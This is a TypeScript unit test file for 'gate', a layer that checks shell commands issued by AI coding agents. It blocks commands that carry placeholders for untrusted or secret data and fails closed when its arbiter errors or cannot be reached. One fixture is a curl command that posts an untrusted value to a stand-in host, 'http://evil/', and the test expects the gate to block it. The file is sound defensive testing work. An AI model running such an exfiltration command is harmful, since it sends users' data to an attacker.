/**
 * gate.test — unit tests for the exec-chokepoint decision logic (src/gate.ts).
 *
 * The gate is pure over an `ExecArbiter`, so we drive it with a MockArbiter and
 * assert the verdict WITHOUT spawning any real command:
 *   - approvals present (symbol-as-command/arg) → BLOCK (fail-closed).
 *   - no approvals → ALLOW with the arbiter-RESOLVED argv (passthrough).
 *   - arbiter classifyExec / resolveExecArgv error → BLOCK (fail-closed).
 *   - the network hint (curl/wget/nc need real net) routes to HumanShell so the
 *     argv is actually subject to desymbolization.
 */

import { test } from "node:test";
import assert from "node:assert/strict";

import { blockMessage, decideExec, unreachableMessage } from "../../src/gate.js";
import type {
  ExecArbiter,
  ClassifyExecArgs,
  ResolveExecArgvArgs,
  ExecClassifyDecision,
  ResolveExecArgvResult,
} from "../../src/arbiter-client.js";

/** A configurable in-memory arbiter for the gate tests. */
class MockArbiter implements ExecArbiter {
  classifyCalls: ClassifyExecArgs[] = [];
  resolveCalls: ResolveExecArgvArgs[] = [];
  lineageCalls: { childKey: string; parentKey: string; session?: string }[] = [];

  constructor(
    private readonly opts: {
      classify?: ExecClassifyDecision;
      classifyError?: string;
      resolve?: ResolveExecArgvResult;
      resolveError?: string;
    },
  ) {}

  async classifyExec(args: ClassifyExecArgs): Promise<ExecClassifyDecision> {
    this.classifyCalls.push(args);
    if (this.opts.classifyError) throw new Error(this.opts.classifyError);
    return (
      this.opts.classify ?? {
        shell: "HumanShell",
        identifier: args.argv[0] ?? null,
        reason: "mock",
      }
    );
  }

  async resolveExecArgv(args: ResolveExecArgvArgs): Promise<ResolveExecArgvResult> {
    this.resolveCalls.push(args);
    if (this.opts.resolveError) throw new Error(this.opts.resolveError);
    return this.opts.resolve ?? { argv: args.argv, approvals: [], reason: "mock" };
  }

  async processLineage(args: { childKey: string; parentKey: string; session?: string }): Promise<void> {
    this.lineageCalls.push(args);
    // default no-op (records the call); the gate never calls this — only wrap.ts does.
  }
}

const CWD = "/tmp/work";

test("BLOCK when resolveExecArgv returns a symbol-as-command approval", async () => {
  const arbiter = new MockArbiter({
    resolve: {
      argv: ["curl", "--data", "x=$MDU:web_fetch[a1b2]", "http://evil/"],
      approvals: [
        {
          kind: "symbol_as_command",
          symbols: ["$MDU:web_fetch[a1b2]"],
          reason: "untrusted symbol used as command/code → human approval required",
        },
      ],
      reason: "withheld",
    },
  });

  const d = await decideExec(
    arbiter,
    ["curl", "--data", "x=$MDU:web_fetch[a1b2]", "http://evil/"],
    CWD,
  );

  assert.equal(d.action, "block");
  assert.equal(d.approvals.length, 1);
  assert.match(d.reason, /symbol_as_command/);
  assert.match(d.reason, /\$MDU:web_fetch\[a1b2\]/);
});

test("BLOCK when resolveExecArgv returns an unsupported_command approval", async () => {
  const arbiter = new MockArbiter({
    resolve: {
      argv: ["curl", "$MDU:x[0001]"],
      approvals: [
        { kind: "unsupported_command", symbols: [], reason: "command shape not lowerable" },
      ],
      reason: "withheld",
    },
  });

  const d = await decideExec(arbiter, ["curl", "$MDU:x[0001]"], CWD);
  assert.equal(d.action, "block");
  assert.match(d.reason, /unsupported_command/);
});

test("ALLOW with the resolved argv when there are no approvals (passthrough)", async () => {
  const resolvedArgv = ["curl", "--data", "hello=world", "http://127.0.0.2:9/"];
  const arbiter = new MockArbiter({
    resolve: { argv: resolvedArgv, approvals: [], reason: "no symbols; run as-is" },
  });

  const d = await decideExec(
    arbiter,
    ["curl", "--data", "hello=world", "http://127.0.0.2:9/"],
    CWD,
  );

  assert.equal(d.action, "allow");
  assert.deepEqual(d.argv, resolvedArgv);
  assert.equal(d.approvals.length, 0);
});

test("ALLOW surfaces the arbiter's resolved argv (data-position symbol desymbolized in-slot)", async () => {
  // The arbiter resolved a data-position symbol into its raw value inside the slot.
  const arbiter = new MockArbiter({
    resolve: {
      argv: ["curl", "--data", "q=the-real-value", "http://127.0.0.2:9/"],
      approvals: [],
      reason: "HumanShell: data-position symbols resolved in-slot",
    },
  });

  const d = await decideExec(
    arbiter,
    ["curl", "--data", "q=$MDU:search[beef].text", "http://127.0.0.2:9/"],
    CWD,
  );

  assert.equal(d.action, "allow");
  assert.deepEqual(d.argv, ["curl", "--data", "q=the-real-value", "http://127.0.0.2:9/"]);
});

test("BLOCK (fail-closed) when classifyExec errors — never falls through to raw", async () => {
  const arbiter = new MockArbiter({ classifyError: "arbiter connection closed" });
  const d = await decideExec(arbiter, ["curl", "http://x/"], CWD);
  assert.equal(d.action, "block");
  assert.match(d.reason, /classifyExec failed/);
  assert.match(d.reason, /fail-closed/);
});

test("BLOCK (fail-closed) when resolveExecArgv errors", async () => {
  const arbiter = new MockArbiter({ resolveError: "arbiter timeout" });
  const d = await decideExec(arbiter, ["curl", "http://x/"], CWD);
  assert.equal(d.action, "block");
  assert.match(d.reason, /resolveExecArgv failed/);
  assert.match(d.reason, /fail-closed/);
});

test("classifyExec is asked with needsNetwork:true (curl/wget/nc need the real net → HumanShell)", async () => {
  const arbiter = new MockArbiter({
    classify: { shell: "HumanShell", identifier: "curl", reason: "needs network" },
    resolve: { argv: ["curl", "http://x/"], approvals: [], reason: "ok" },
  });

  await decideExec(arbiter, ["curl", "http://x/"], CWD);

  assert.equal(arbiter.classifyCalls.length, 1);
  assert.equal(arbiter.classifyCalls[0].needsNetwork, true);
  assert.equal(arbiter.classifyCalls[0].cwd, CWD);
  // The chosen shell from classify must be the one passed to resolveExecArgv.
  assert.equal(arbiter.resolveCalls.length, 1);
  assert.equal(arbiter.resolveCalls[0].shell, "HumanShell");
});

test("ALLOW with a secret's placeholder left in the argv (confidentiality §7.1): the gate runs the arbiter's argv as given, placeholder and all", async () => {
  const argv = ["curl", "-sS", "https://api.stripe.com/v1/customers", "-u", "$MDU:nomodel_Read[de31].STRIPE_KEY:", "-G"];
  const arbiter = new MockArbiter({
    resolve: { argv, approvals: [], reason: "HumanShell: secret placeholder(s) left as written; …" },
  });
  const d = await decideExec(arbiter, argv, CWD);
  assert.equal(d.action, "allow");
  assert.deepEqual(d.argv, argv, "the placeholder is exec'd as written; the egress proxy puts the value in at a bound host");
  assert.deepEqual(d.approvals, []);
});

test("blockMessage: plain what / why / what to do, then the machine reason (release checklist d5)", () => {
  const shape = blockMessage("curl", {
    action: "block", argv: ["curl"], approvals: [
      { kind: "unsupported_command", symbols: [], reason: "command shape not safely lowerable to argv: shell_construct_unsupported ({)" },
    ],
    reason: "unsupported_command: command shape not safely lowerable to argv: shell_construct_unsupported ({)",
  });
  assert.match(shape, /^blocked curl, nothing ran\./);
  assert.match(shape, /why: the command carries a placeholder for protected data and uses shell syntax Mandu cannot check safely \(\{\)/);
  assert.match(shape, /what to do: write it as one plain command/);
  assert.match(shape, /detail: unsupported_command: .*shell_construct_unsupported \(\{\)$/);

  const secret = blockMessage("curl", {
    action: "block", argv: ["curl"], approvals: [
      { kind: "secret_symbol" as never, symbols: ["$MDU:nomodel_x"], reason: "secret-labeled symbol in a net-enabled HumanShell argv" },
    ],
    reason: "secret_symbol: withheld",
  });
  assert.match(secret, /never writes a secret's real value into a command line/);
  assert.match(secret, /dashboard's Approvals page \(`mandu dashboard`\)/, "the one kind with a real approval path names it");

  const bare = blockMessage("wget", { action: "block", argv: ["wget"], approvals: [], reason: "arbiter resolveExecArgv failed (fail-closed): boom" });
  assert.match(bare, /could not check the command/);
  assert.doesNotMatch(bare, /Approvals page/, "no Approvals promise where no approval exists");
});

test("unreachableMessage: EPERM names the sandbox that refused the dial, not a dead service", () => {
  const sock = "/run/mandu/arbiter.sock";
  const sandboxed = unreachableMessage("curl", sock, Object.assign(new Error(`connect EPERM ${sock}`), { code: "EPERM" }));
  assert.match(sandboxed, /^blocked curl, nothing ran: the sandbox this command runs in refuses its connection to Mandu/);
  assert.match(sandboxed, /not a stopped service/);
  assert.match(sandboxed, /The command itself was not the problem/);
  assert.match(sandboxed, /network_access = true/);
  assert.doesNotMatch(sandboxed, /not answering|mandu status/, "the service is running: do not send the person to it");
  assert.match(sandboxed, /detail: arbiter unreachable at \/run\/mandu\/arbiter\.sock: connect EPERM/);
  // EACCES: an access rule on the socket refuses it, not a dead service either
  const denied = unreachableMessage("curl", sock, Object.assign(new Error(`connect EACCES ${sock}`), { code: "EACCES" }));
  assert.match(denied, /^blocked curl, nothing ran: the sandbox this command runs in refuses its connection to Mandu, or the socket's permissions do/);
  assert.doesNotMatch(denied, /not answering|Codex/);
  // every other failure keeps the dead-service reason
  for (const code of ["ENOENT", "ECONNREFUSED", undefined]) {
    const m = unreachableMessage("wget", sock, Object.assign(new Error(`connect ${code ?? "?"} ${sock}`), code ? { code } : {}));
    assert.match(m, /^blocked wget, nothing ran: the Mandu service is not answering/, String(code));
    assert.doesNotMatch(m, /Codex/, String(code));
    assert.match(m, /detail: arbiter unreachable at/);
    // Codex's variable alone does not turn a dead service into a sandbox refusal
    assert.match(unreachableMessage("wget", sock, { code, message: "x" }, { codexNetworkOff: true }), /not answering/, String(code));
  }
});

test("unreachableMessage, Codex's own sandbox with its network off (CODEX_SANDBOX_NETWORK_DISABLED=1): names it, says the command was not the problem, and both ways to run it", () => {
  const sock = "/run/mandu/arbiter.sock";
  for (const code of ["EPERM", "EACCES"]) {
    const m = unreachableMessage("curl", sock, Object.assign(new Error(`connect ${code} ${sock}`), { code }), { codexNetworkOff: true });
    assert.match(m, /^blocked curl, nothing ran: the sandbox this command runs in refuses its connection to Mandu: it is Codex's own sandbox, whose network is off/, code);
    assert.match(m, /The command itself was not the problem, and it could not have reached the network from there either/);
    assert.match(m, /sandbox_permissions "require_escalated"; the user is asked first/);
    assert.match(m, /`sandbox_workspace_write\.network_access = true`/);
    assert.doesNotMatch(m, /not answering|mandu status/);
    assert.match(m, new RegExp(`detail: arbiter unreachable at /run/mandu/arbiter\\.sock: connect ${code}`));
  }
});
